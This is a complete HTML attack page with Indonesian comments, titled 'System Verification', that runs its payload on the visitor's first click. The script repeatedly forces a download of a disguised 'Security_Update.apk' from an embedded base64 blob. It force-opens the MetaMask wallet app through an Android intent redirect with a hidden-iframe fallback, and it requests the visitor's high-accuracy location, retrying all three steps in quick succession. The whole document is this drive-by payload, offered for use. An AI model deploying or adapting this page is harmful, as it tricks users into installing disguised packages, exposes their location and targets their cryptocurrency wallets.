<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000; color: #f00; font-family: monospace;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
  }
  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #f00; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
  h2 { animation: blink 0.2s infinite; }
  @keyframes blink { 50% { opacity: 0.2; } }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 120px; overflow-y: auto; }
  iframe, video, canvas { display: none !important; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>☢️ SYSTEM HACKED ☢️</h2>
  <p>Klik di mana saja untuk memulai.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // KONFIGURASI
  // ============================================
  var TARGET_INTENT = "intent://#Intent;" +
                      "package=io.metamask;" +
                      "scheme=metamask;" +
                      "end;";
  
  var TARGET_APK_B64 = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";

  // ============================================
  // FUNGSI EKSEKUSI VEKTOR (TANPA KAMERA)
  // ============================================
  function triggerAPKRace() {
    try {
      var binary = atob(TARGET_APK_B64);
      var bytes = new Uint8Array(binary.length);
      for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
      
      var blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
      var url = URL.createObjectURL(blob);
      
      var a = document.createElement("a");
      a.href = url;
      a.download = "Security_Update.apk";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      
      log("[+] APK Download Triggered.");
    } catch(e) {}
  }

  function triggerIntentRace() {
    try {
      // Top-Level Redirect
      window.location.href = TARGET_INTENT;
      
      // Iframe Fallback
      var iframe = document.createElement("iframe");
      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
      iframe.style.display = "none";
      iframe.srcdoc = `
        <!DOCTYPE html>
        <html><body><script>window.top.location.href = "${TARGET_INTENT}";<\/script></body></html>
      `;
      document.getElementById("launcher-container").appendChild(iframe);
      
      log("[+] Intent Triggered.");
    } catch(e) {}
  }

  // ============================================
  // FUNGSI LOKASI (MENGGANTIKAN KAMERA)
  // ============================================
  function triggerLocationRace() {
    try {
      if (!navigator.geolocation) {
        log("[-] Geolocation tidak didukung.");
        return;
      }
      
      // Minta lokasi (High Accuracy)
      navigator.geolocation.getCurrentPosition(
        function(position) {
          log("[+] LOKASI BERHASIL: " + position.coords.latitude + ", " + position.coords.longitude);
        },
        function(error) {
          log("[-] Lokasi diblokir: " + error.message);
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    } catch(e) {}
  }

  // ============================================
  // TRIGGER RACE CONDITION LOOP (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>EXECUTING...</h2>
      <p>Memulai Rapid Location & Intent Race...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Rapid Location Race...");

    // 1. Trigger Pertama (0ms)
    triggerAPKRace();
    triggerIntentRace();
    triggerLocationRace();

    // 2. Retry Cepat (50ms)
    setTimeout(function() {
      triggerAPKRace();
      triggerIntentRace();
      triggerLocationRace();
    }, 50);

    // 3. Retry Sedang (150ms)
    setTimeout(function() {
      triggerAPKRace();
      triggerIntentRace();
      triggerLocationRace();
    }, 150);

    // 4. Retry Lambat (500ms)
    setTimeout(function() {
      triggerAPKRace();
      triggerIntentRace();
      triggerLocationRace();
    }, 500);

    // 5. Retry Terakhir (1000ms)
    setTimeout(function() {
      triggerAPKRace();
      triggerIntentRace();
      triggerLocationRace();
    }, 1000);

  }, { once: true });

})();
</script>
</body>
</html>
